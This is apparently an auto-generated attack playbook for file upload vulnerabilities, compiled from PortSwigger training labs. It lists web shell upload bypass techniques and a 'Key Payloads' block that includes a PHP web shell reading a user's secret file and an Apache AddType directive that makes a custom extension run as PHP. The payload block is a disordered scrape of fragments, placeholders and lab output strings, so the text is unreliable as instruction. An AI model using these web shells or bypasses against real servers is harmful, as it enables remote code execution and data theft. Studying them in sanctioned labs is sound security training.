## FILE UPLOAD Playbook
*Synthesized from 7 PortSwigger labs*

### Overview
This playbook covers 7 known attack techniques for file_upload.

### Attack Techniques

**Bypass Techniques:**
- Web shell upload via Content-Type restriction bypass
- Web shell upload via extension blacklist bypass

**General:**
- Remote code execution via polyglot web shell upload
- Remote code execution via web shell upload
- Web shell upload via obfuscated file extension
- Web shell upload via path traversal
- Web shell upload via race condition

### Key Payloads
```
/files
.jpg
Content-Type
image/png
The file avatars/../exploit.php has been uploaded.
\r\n\r\n
.l33t
<?php echo file_get_contents('/home/[TARGET_USER]/secret'); ?>
filename
<YOUR-GET-REQUEST>
START
/files/avatars/exploit.php
text/plain
The file avatars/exploit.php has been uploaded.
START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END
mod_php
<YOUR-POST-REQUEST>
POST /my-account/avatar
AddType application/x-httpd-php .l33t
application/x-httpd-php
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

